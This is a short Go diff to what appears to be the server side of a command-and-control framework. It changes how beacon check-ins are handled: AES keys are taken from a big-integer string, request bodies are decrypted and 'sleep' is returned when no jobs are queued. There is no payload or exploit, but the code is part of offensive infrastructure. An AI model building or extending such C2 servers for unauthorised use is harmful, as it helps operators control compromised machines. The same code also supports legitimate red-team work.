@@ -68,13 +68,12 @@ func POST_handler(body []byte, listener *Listener, r *http.Request, w http.Respo
 		} else if beacon.Ip == ip && beacon.AESkey != "" && beacon.Arch == "" {
 			bigInt := new(big.Int)
 			bigInt, _ = bigInt.SetString(beacon.AESkey, 10)
-			eAES := getAES(bigInt.Bytes())
-			json_byte := eAES.DecryptData(ReverseBytes(GetBytes(body, len(body))))
+			eAES := getAES(ReverseBytes(bigInt.Bytes()))
+			json_byte := eAES.DecryptData(GetBytes(body, len(body)))
+
+			println(string(json_byte))
 
 			var beacon_tmp Beacon
-
-			printkey(json_byte)
-			println(string(json_byte))
 
 			err := json.Unmarshal(json_byte, &beacon_tmp)
 
@@ -92,8 +91,11 @@ func POST_handler(body []byte, listener *Listener, r *http.Request, w http.Respo
 			return res, true
 
 		} else if beacon.Ip == ip && beacon.AESkey != "" && beacon.Arch != "" {
-			eAES := getAES(stringToBytes(beacon.AESkey))
-			json_byte := eAES.DecryptData(ReverseBytes(GetBytes(body, len(body))))
+			bigInt := new(big.Int)
+			bigInt, _ = bigInt.SetString(beacon.AESkey, 10)
+			eAES := getAES(ReverseBytes(bigInt.Bytes()))
+			json_byte := eAES.DecryptData(GetBytes(body, len(body)))
+
 			if json_byte == nil {
 				if is_jobs_null(listener, i) {
 					return res, true // sleep
